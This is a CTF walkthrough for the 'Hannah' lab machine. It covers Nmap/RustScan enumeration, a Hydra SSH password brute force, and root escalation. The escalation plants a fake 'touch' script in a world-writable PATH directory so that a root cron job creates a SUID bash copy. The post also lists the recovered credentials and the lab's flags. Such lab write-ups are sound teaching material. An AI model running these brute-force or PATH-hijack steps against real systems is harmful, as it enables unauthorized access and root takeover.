+++
title = "Hannah - Walkthrough"
date = "2026-07-15"
author = "nvru"
description = "Walkthrough for the Hannah machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "nginx",
  "cron",
  "path-hijacking",
  "ssh-bruteforce",
  "privilege-escalation"
]
draft = false
+++

# Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.24`

The objective was to enumerate the target, identify exposed services, gain initial access through SSH credential brute forcing, and escalate privileges by abusing an insecure `PATH` configuration in a root cron job.

![Machine information](/images/hmv/hannah/vm.png)

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.24 -- -sC -sV -A -oA nmap/rust
```

## Results

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp  open  http    nginx 1.18.0
113/tcp open  ident
```

Only three ports were exposed:

- **22** - SSH
- **80** - HTTP (nginx)
- **113** - Ident

SSH immediately became an interesting target because Nmap revealed the username **moksha** as the owner of the HTTP service.

---

# Enumeration

## HTTP

Browsing to the web server only displayed a simple **"Under construction"** page.

There was nothing useful in the page source.

![Website](/images/hmv/hannah/http.png)

---

## robots.txt

Checking `robots.txt` revealed an interesting entry.

```text
/enlightenment
```

![robots](/images/hmv/hannah/robots.png)

Unfortunately, visiting the directory only resulted in a **404 Not Found** page.

![404](/images/hmv/hannah/404.png)

Since nothing useful was available through the website, I continued with further enumeration.

---

## Directory Enumeration

Directory brute forcing did not reveal any additional content.

Because Nmap had already disclosed the username **moksha**, I decided to attempt password brute forcing against SSH instead.

---

# Initial Access

## SSH Brute Force

Using Hydra:

```bash
hydra -l moksha -P /opt/wordlists/rockyou-75.txt ssh://10.10.10.24
```

Hydra successfully recovered the credentials:

```text
Username: moksha
Password: hannah
```

![Hydra](/images/hmv/hannah/brute.png)

Using the recovered credentials, SSH authentication succeeded.

![SSH Login](/images/hmv/hannah/ssh_moksha.png)

---

# Privilege Escalation

## Enumeration

The first thing I checked was whether sudo was installed.

```bash
sudo -l
```

However, `sudo` was not installed.

![sudo](/images/hmv/hannah/sudo.png)

I also checked whether the system used **doas** instead.

Unfortunately, it was not available either.

![doas](/images/hmv/hannah/doas_path.png)

I continued searching for common privilege escalation vectors.

### /opt

Nothing interesting was found.

![opt](/images/hmv/hannah/opt.png)

### Web Directory

The web directory also contained nothing useful.

![web](/images/hmv/hannah/web.png)

### User Cron Jobs

The **moksha** user had no cron jobs configured.

![moksha cron](/images/hmv/hannah/moksha_cron.png)

---

## Root Cron Job

Checking root's cron jobs revealed something much more interesting.

Root periodically executed:

```text
touch /tmp/enlIghtenment
```

![Root Cron](/images/hmv/hannah/root_cron.png)

While inspecting the environment, I noticed that `/media` was included in the system `PATH`.

Even more importantly, `/media` was **world writable**, allowing any user to create executable files there.

![Media Permissions](/images/hmv/hannah/media_perm.png)

This opened the door for a classic **PATH hijacking** attack.

---

## PATH Hijacking

I created a malicious executable named `touch` inside `/media`.

```bash
#!/usr/bin/env bash

cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
```

After creating the file, I made it executable.

```bash
chmod 777 /media/touch
```

> The `777` permissions are excessive but acceptable for this CTF demonstration.

To monitor the attack, I watched the `/tmp` directory.

```bash
watch ls -la /tmp/
```

Eventually, the root cron job executed my malicious `touch` binary instead of the legitimate system binary.

A SUID bash shell was created.

Running:

```bash
/tmp/shell -p
```

provided a root shell.

![Root Shell](/images/hmv/hannah/root.png)

---

# Credentials

```text
moksha:hannah
```

---

# Flags

```text
user:HMVGGHFWP2023

root:HMVHAPPYNY2023
```
